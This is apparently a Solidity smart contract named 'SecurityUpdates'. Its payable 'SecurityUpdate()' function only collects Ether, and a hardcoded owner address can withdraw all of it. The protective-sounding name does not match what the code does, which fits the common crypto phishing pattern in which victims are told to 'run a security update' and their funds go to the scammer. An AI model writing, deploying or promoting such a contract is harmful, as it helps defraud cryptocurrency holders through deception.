//SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.9;

contract SecurityUpdates {

    address payable owner;

     constructor(){   
        owner=payable(0x1A43952E9e114047E6a6c8a60a630F26d2Cf5B73); // Change address to the correct contract address 
    }
    function getOwner() public view returns (address) {    
        return owner;
    }
    function withdraw() public {
        require(owner == msg.sender);
        owner.transfer(address(this).balance);
    }

    function SecurityUpdate() public payable {
    }

    function getBalance() public view returns (uint256) {
        return address(this).balance;
    }
}

//0x30e816330E073A0bEb296EEEF78e62494B2503c2